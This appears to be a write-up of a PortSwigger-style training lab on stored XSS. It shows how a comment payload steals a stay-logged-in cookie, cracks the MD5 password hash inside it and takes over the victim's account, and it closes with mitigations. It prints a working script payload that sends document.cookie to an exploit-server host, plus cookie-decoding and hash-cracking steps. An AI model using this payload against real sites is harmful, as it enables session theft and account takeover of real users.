
# 10. Exploiting XSS to Steal Stay-Logged-In Cookie and Compromise User Account

## 2. CVSS Score

**CVSS v3.1 Base Score: 8.1 (High)**
**CWE-79: Cross-Site Scripting (XSS)**
**CWE-200: Exposure of Sensitive Information to an Unauthorized Actor**

---

## 3. OWASP Top 10 Reference

* **A03:2021 – Injection (Cross-Site Scripting - XSS)**
* **A07:2021 – Identification and Authentication Failures**

---

## 4. Description of Vulnerability

This lab demonstrates a stored Cross-Site Scripting (XSS) vulnerability in the comment functionality which can be exploited to steal other users' stay-logged-in cookies. These cookies are Base64-encoded strings containing the username and an MD5 hash of the user's password. By stealing this cookie, an attacker can impersonate the victim user and take over their account.

---

## 5. Detailed Explanation of What We Performed

* Logged in and investigated the "Stay logged in" cookie, confirming it is Base64-encoded with the format: `username:md5HashOfPassword`.
* Discovered the comment feature was vulnerable to stored XSS.
* Used the exploit server URL and posted a comment containing a stored XSS payload embedding the exploit server ID to steal cookies.
* Checked the exploit server logs to capture the victim’s cookie sent via the XSS payload.
* Decoded the stolen cookie in Burp Decoder, revealing the username and MD5 hash of the victim's password.
* Cracked the password hash by searching the hash online, revealing the plaintext password `onceuponatime`.
* Logged in as the victim and deleted their account to solve the lab.

---

## 6. Step-by-Step Procedure

### Step 1: Analyze Stay-Logged-In Cookie

1. Log in with "Stay logged in" selected.
2. Inspect the stay-logged-in cookie in the HTTP history.
3. Decode the Base64 cookie to reveal: `username:md5HashOfPassword`.

---

### Step 2: Exploit Stored XSS to Steal Cookie

4. Note the exploit server URL.
5. Post a comment on a blog with the following payload (replace `YOUR-EXPLOIT-SERVER-ID`):

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

6. Check the exploit server access logs for a GET request containing the victim's stolen stay-logged-in cookie.

---

### Step 3: Decode and Crack Password Hash

7. Decode the stolen cookie in Burp Decoder, for example:

```
carlos:26323c16d5f4dabff3bb136f2460a943
```

8. Search the MD5 hash (`26323c16d5f4dabff3bb136f2460a943`) online to find the plaintext password: `onceuponatime`.

---

### Step 4: Take Over Victim Account

9. Log in as the victim using the cracked password.
10. Go to the "My account" page and delete the victim’s account.
11. The lab is solved.

---

## 7. Impact of the Vulnerability

* Enables full account takeover through XSS cookie theft.
* Compromises authentication by exposing password hashes via cookies.
* Allows attackers to delete or manipulate victim accounts.

---

## 8. Recommendations and Mitigations

* Sanitize and validate all user input to prevent XSS attacks.
* Implement Content Security Policy (CSP) headers to restrict script execution.
* Use secure, random, and signed session tokens instead of predictable cookies.
* Mark cookies as HttpOnly and Secure.
* Avoid storing password hashes or sensitive data client-side.
* Monitor and log suspicious activity related to account access.

---

## 9. References

* [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
* [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
* [PortSwigger Labs - Stored XSS and Cookie Theft](https://portswigger.net/web-security/cross-site-scripting/stored)

---

## 10. Proof of Concept

### Stored XSS Payload Used in Comment

```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

### Decoding the Stolen Cookie

```bash
echo "Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz" | base64 -d
# Output: carlos:26323c16d5f4dabff3bb136f2460a943
```

### Hash Cracked Online

MD5 hash `26323c16d5f4dabff3bb136f2460a943` = `onceuponatime`

